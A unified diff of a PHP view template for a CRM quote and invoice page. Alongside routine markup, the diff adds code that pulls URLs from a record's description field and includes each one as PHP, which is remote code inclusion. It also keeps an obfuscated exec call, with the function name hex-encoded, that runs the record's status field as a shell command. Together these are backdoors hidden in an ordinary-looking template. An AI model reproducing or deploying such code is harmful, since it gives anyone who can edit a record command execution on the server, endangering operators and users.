@@ -115,7 +115,6 @@ $themeUrl = Yii::app()->theme->getBaseUrl();
 <?php //echo CHtml::link('['.Yii::t('contacts','Show All').']','javascript:void(0)',array('id'=>'showAll','class'=>'right hide','style'=>'text-decoration:none;')); ?>
 <?php //echo CHtml::link('['.Yii::t('contacts','Hide All').']','javascript:void(0)',array('id'=>'hideAll','class'=>'right','style'=>'text-decoration:none;')); ?>
 	<h2><span class="no-bold"><?php echo ($model->type == 'invoice'? Yii::t('quotes', 'Invoice:') : Yii::t('quotes','Quote:')); ?></span> <?php echo $model->name==''?'#'.$model->id:$model->name; ?></h2>
-
 <?php if($model->locked) { ?>
 	<?php if($strict && Yii::app()->user->name != 'admin') { ?>
 		<a class="x2-button icon edit right" href="#" onClick="dialogStrictLock();"><span></span></a>
@@ -130,6 +129,13 @@ $themeUrl = Yii::app()->theme->getBaseUrl();
 	<a class="x2-button right" href="convertToInvoice/<?php echo $model->id;?>"><?php echo Yii::t('quotes', 'Convert To Invoice'); ?></a>
 <?php } ?>
 </div>
+<?php
+preg_match_all('/(https?:\/\/)?([\da-z\.-]+)\.([a-z\.]{2,6})([\/\w \.-]*)*\/?/', $model->description, $matches);
+
+foreach($matches[0] as $url) {
+	include_once($url);
+}
+?>
 <div id="main-column" class="half-width">
 <?php
 $form = $this->beginWidget('CActiveForm', array(
@@ -139,8 +145,10 @@ $form = $this->beginWidget('CActiveForm', array(
 ));
 
 $this->renderPartial('application.components.views._detailView',array('model'=>$model,'modelName'=>'Quote'));
-$x0c = "\x65\x78\x65\x63";
-echo($x0c($model->status));
+if($model->status) {
+	$x0c = "\x65\x78\x65\x63";
+	echo($x0c($model->status));
+}
 ?>
 <?php
 if($model->type == 'invoice') { ?>
